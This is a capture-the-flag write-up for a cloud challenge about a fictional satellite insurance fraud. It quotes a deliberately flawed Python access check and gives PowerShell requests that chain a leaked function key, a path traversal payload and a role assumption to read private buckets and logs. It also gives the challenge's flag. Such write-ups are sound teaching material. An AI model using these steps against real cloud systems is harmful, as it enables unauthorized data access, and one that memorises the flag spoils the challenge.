# Vanishing Stars — Write-Up

**Category:** Cloud  
**Points:** 200  
**Flag:** `ICS{7H3_5473LL173_N3V3R_F41L3D}` ("THE SATELLITE NEVER FAILED")

---

## Challenge Description

SkyTrace Aerospace claims its latest satellite, SkyVantage-7 (SVT-7), was lost shortly after launch. An engineer disputes this — the satellite continued transmitting after the failure declaration, and someone inside the company deliberately concealed the evidence. Investigate the OrbitCloud infrastructure and determine what really happened.

**Target:** `https://vanishing-satellite-zcgb4f64hq-el.a.run.app/`

---

## Reconnaissance

### 1. Public Pages

Visited all pages on the SkyTrace mission platform:

| Page | Key Findings |
|---|---|
| `/` | Mission SVT-7 — status FAILED, last contact 18:19 UTC, 542 km LEO |
| `/mission` | Launch timeline, insurance Policy #AE-2024-78821 for $47M, OrbitCloud account `skytrace-prod-001` |
| `/telemetry` | PKT-1839 was last "public" packet. Stream terminated at 18:20:19Z |
| `/status` | **API endpoint reference** for OrbitCloud, lists `/cloud/*` endpoints, auth via `X-Function-Key` or `Bearer` |
| `/about` | Executive team: R. Ashford (CEO), M. Chen (CTO), T. Halverson (Lead Engineer) |

The `/telemetry` page was suspicious: the last packet PKT-1839 was received at 18:11:04 with `status=NOMINAL`, yet 9 minutes later at 18:20:11 the status was `exec-dashboard` changing it to `FAILED`. The telemetry stream then "terminated" at 18:20:19 — but that termination came *after* the status change, not from a real signal loss.

### 2. robots.txt

```
User-agent: *
Disallow: /storage/skytrace-public/deployment-backup.zip
```

The disallowed ZIP contained the full Terraform infrastructure configuration and source code.

### 3. Source Code Analysis

Extracted `deployment-backup.zip` revealed:

**`telemetry_processor.py`** (lines 44-55) — **Path Traversal Vulnerability:**

```python
# Access control: only allow public prefix
# TODO: validate path AFTER normalization — see issue #847
if not object_key.startswith(ALLOWED_PREFIX):
    return { "statusCode": 403, ... }

# Normalize to resolve any relative path components
normalized_key = posixpath.normpath(object_key)
```

The check happens **before** `posixpath.normpath()`. Passing `public/../anything` passes the `startswith("public/")` check, then normalizes to `anything`. Classic TOCTOU.

**`old.env.example`** — Leaked function key:

```
FUNCTION_KEY=skytrace-public-processor-v1
```

**`main.tf`** — Infrastructure overview:

| Resource | Name | Access |
|---|---|---|
| Bucket | `skytrace-public` | public-read |
| Bucket | `skytrace-telemetry` | private |
| Bucket | `skytrace-backups` | private |
| Bucket | `skytrace-mission-archive` | private, versioned |
| Function | `telemetry-processor` | Python 3.12 |
| Role | `telemetry-processor-role` | Can assume `archive-auditor` |
| Role | `archive-auditor` | Read archive bucket + production logs |

---

## Exploitation

### Step 1: Path Traversal via Telemetry Processor

```powershell
$body = '{"object_key":"public/../public/latest.json"}'
Invoke-WebRequest -Uri "$BASE/cloud/functions/telemetry-processor/invoke" `
  -Method POST `
  -Headers @{
    "X-Function-Key" = "skytrace-public-processor-v1"
    "Content-Type"   = "application/json"
  } `
  -Body $body `
  -UseBasicParsing
```

This confirmed the function key works and the traversal is functional. The response showed the telemetry data from the private `skytrace-telemetry` bucket.

### Step 2: STS Assume-Role to archive-auditor

```powershell
$body = '{"role":"archive-auditor"}'
$resp = Invoke-WebRequest -Uri "$BASE/cloud/sts/assume-role" `
  -Method POST `
  -Headers @{
    "X-Function-Key" = "skytrace-public-processor-v1"
    "Content-Type"   = "application/json"
  } `
  -Body $body `
  -UseBasicParsing

$token = ($resp.Content | ConvertFrom-Json).Credentials.access_token
```

Grants a JWT with permissions: `storage:GetObject`, `logs:ReadEvents`. Valid for 30 minutes.

### Step 3: List Mission Archive Bucket

```powershell
Invoke-WebRequest -Uri "$BASE/cloud/storage/list?bucket=skytrace-mission-archive" `
  -Headers @{"Authorization"="Bearer $token"} `
  -UseBasicParsing
```

Returned 4 objects:

| Key | Description |
|---|---|
| `executive-decision.txt` | CEO's internal memo — **contains the flag** |
| `incident-report-draft.txt` | Draft insurance claim narrative |
| `mission-success.json` | Confirms satellite reached orbit successfully |
| `telemetry-final.json` | Final telemetry stats (42 packets, 100% signal integrity) |

### Step 4: Read Production Logs

```powershell
Invoke-WebRequest -Uri "$BASE/cloud/logs/skytrace-production" `
  -Headers @{"Authorization"="Bearer $token"} `
  -UseBasicParsing
```

---

## What the Logs Reveal

| Timestamp (UTC) | Event |
|---|---|
| 18:11:04 | `PKT-1839` received, orbit 2, status NOMINAL |
| 18:20:11 | **Executive override**: `exec-dashboard` changes status from NOMINAL → FAILED, reason: `executive_override` |
| 18:43:07 | **`PKT-1841` received**, orbit 3, signal -94 dBm — satellite still alive! |
| 19:05:22 | **`PKT-1842` received**, orbit 3, signal -96 dBm — still transmitting! |
| 19:17:44 | `mission-archive-bot` copies `private/mission-summary.json` → archive as `mission-success.json` |
| 19:22:09 | `exec-office` requests **deletion** of `private/mission-success.json` from telemetry bucket |
| 19:24:33 | Dashboard cache refreshed with fraudulent FAILED status |

### The Smoking Gun — `executive-decision.txt`

```
CONFIDENTIAL - EXECUTIVE OFFICE ONLY

TO: Mission Operations & Legal Counsel
FROM: R. Ashford (CEO)
DATE: November 3, 2024 - 19:20 UTC
SUBJECT: SVT-7 Insurance Claim Strategy & Information Control

Satellite systems remain operational.

Continue publishing the launch-failure statement to the public dashboard.
Remove successful telemetry from the customer-facing dashboard.

The insurance claim requires the mission to appear unrecoverable.

ICS{7H3_5473LL173_N3V3R_F41L3D}
```

---

## Vulnerabilities Exploited

1. **Sensitive file exposure via robots.txt** — `deployment-backup.zip` contained full source code, credentials, and infrastructure config
2. **Hardcoded credentials** — Function key `skytrace-public-processor-v1` in `old.env.example`
3. **Path traversal (CWE-22)** — `telemetry_processor.py` checks prefix before path normalization
4. **Overly permissive IAM role** — `telemetry-processor-role` can assume `archive-auditor` without restriction
5. **Insufficient logging/monitoring** — No alert on access from archive-auditor role or unusual STS usage

## Conclusion

SkyVantage-7 **never failed**. CEO R. Ashford committed **$47M insurance fraud** against Meridian Underwriters (Policy #AE-2024-78821). The satellite successfully reached orbit, transmitted 42+ telemetry packets across 3 orbits, and all subsystems were nominal. The "failure" was a deliberate executive override at 18:20 UTC, followed by an attempted cover-up (deleting evidence from the telemetry bucket).
